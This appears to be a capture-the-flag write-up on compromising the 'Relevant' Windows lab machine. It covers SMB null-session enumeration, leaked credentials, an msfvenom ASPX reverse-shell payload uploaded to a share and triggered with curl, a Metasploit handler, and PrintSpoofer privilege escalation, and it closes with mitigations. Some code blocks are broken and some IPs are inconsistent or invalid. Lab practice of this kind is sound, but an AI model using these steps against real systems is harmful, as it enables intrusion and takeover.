ðŸ§  Introduction 

Hello, I'm Dr4xven, a dedicated Red Team enthusiast with a focus on offensive security. My primary area of expertise lies in penetration testing. In this write-up, I'll guide you through my process of compromising a vulnerable machine "Relevant", from initial access to achieving root privileges. The system I targeted was running outdated services, which presented an ideal opportunity for a thorough security assessment. Throughout this exercise, I employed various exploitation techniques, successfully escalating privileges and ultimately gaining full control of the system.

This room provides an excellent opportunity to practice:

    SMB enumeration and credential reuse

    Remote Desktop Protocol (RDP) brute-forcing and login attempts

    ASPX webshell deployment and command execution

    Payload delivery using crev.aspx

    Reverse shell capture via Metasploit

    Privilege escalation from a low-privilege user to SYSTEM

Objective: Gain initial access using found credentials and a hosted malicious payload, escalate privileges, and capture both the user and root flags â€” demonstrating full compromise of the Windows target.

## Shares Enumeration
Initial enumeration was performed using smbclient with null session authentication, which allowed for the discovery of accessible SMB shares without the need for credentials

```php
smbclient -N -L //10.10.243.99 
```

Results

```php
smbclient -N -L //10.10.243.99                                                                                                 î‚² âœ” î‚¶ at 08:51:46 ï€— î‚¼

```
Among the discovered shares, `nt4wrksv` appeared particularly interesting. Attempting to access it using null authentication was successful, allowing further exploration of its contents.

```php
 smbclient //10.10.243.99/nt4wrksv -U '' -p ''
```

The file was subsequently downloaded to my attacking machine for in-depth analysis.

![image.png](assets/screenshots/Relevant/3.webp)

```php
Bob - !P@$$W0rD!123 
```

```php
Bill - Juw4nnaM4n420696969!$$$
```

Findings: During the analysis, I successfully extracted user credentials stored within the downloaded file.

### Using crackmapexec
Using CrackMapExec, I performed credentialed enumeration of SMB shares to validate access and identify any accessible resources based on the recovered credentials.
The enumeration revealed that the user Bill had valid access to the SMB shares.

Bill have the access

```php

### Foothold

For initial access, I generated a malicious ASPX payload using MSFvenom and uploaded it to the writable SMB share to achieve remote code execution.

```php
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.122.233 LPORT=1234 -f aspx > rev-shell.aspx
```

Uploading

![image.png](assets/screenshots/Relevant/6.webp)

I triggered the payload by issuing a curl request to the uploaded ASPX file using the following command:

```php
curl http://10.10.242.36:49663/nt4wrksv/backup.aspx
```
Upon triggering the payload, I prepared to receive the reverse shell using msfconsole. I configured the handler as follows:
```php
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 10.23.266.210
set LPORT 9998
run
```

### Access

![image.png](assets/screenshots/Relevant/8.webp)

The system response was notably slow, so I proceeded with caution and patience during post-exploitation. Eventually, I was able to enumerate user directories and successfully located the user.txt flag at:
```php
C:\Users\Bob\Desktop\user.txt
```

```php
c:\Users\Bob\Desktop>dir
dir                                            
 Volume in drive C has no label.

## Privilege escalation
Upon gaining a foothold, I inspected the current user's privileges using the whoami /priv command. The output revealed that the user possessed the following key privilege:

    SeImpersonatePrivilege â€“ Impersonate a client after authentication â€“ Enabled

This is a high-value privilege often abused in local privilege escalation scenarios, especially in Windows environments. With this privilege enabled, I determined that the system was likely vulnerable to token impersonation attacks.

I leveraged this capability using a known technique to escalate to NT AUTHORITY\SYSTEM, granting full administrative access over the target machine.  

```php
c:\Users\Bob\Desktop>whoami/priv
whoami/priv

To exploit this, I downloaded PrintSpoofer64.exeâ€”a tool that abuses this privilege to escalate to SYSTEMâ€”using the following command:

```php
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

Once downloaded, I executed it with the following command to spawn a SYSTEM shell:

```php
PrintSpoofer64.exe -i -c cmd
```

This successfully elevated my privileges to NT AUTHORITY\SYSTEM, allowing full access to the target machine.

Results

```php
C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd

# Conclusion and Recommendations

During the assessment of the Relevant machine, initial access was achieved through unauthenticated SMB enumeration, which exposed sensitive information including user credentials. Further enumeration confirmed valid user access, leading to the deployment of a malicious web shell via a writable SMB share. Exploitation was completed by leveraging the SeImpersonatePrivilege through PrintSpoofer64.exe, ultimately gaining SYSTEM-level access.

This compromise highlights critical misconfigurations and excessive privilege assignments that could allow attackers to escalate access and fully control the system. To mitigate such risks and strengthen the systemâ€™s security posture, the following actions are strongly recommended:

    Disable null sessions on SMB.

    Enforce strict access control on shared resources.

    Regularly monitor and audit SMB activity.

    Revoke unnecessary user privileges, especially impersonation rights.

    Disable unused web services or enforce proper access controls.

    Implement application whitelisting to block unauthorized binaries.

    Maintain regular system and software updates.

    Apply network segmentation to limit access to internal services.

By implementing these measures, the system can be better protected against similar exploitation techniques in the future and aligned with security best practices.
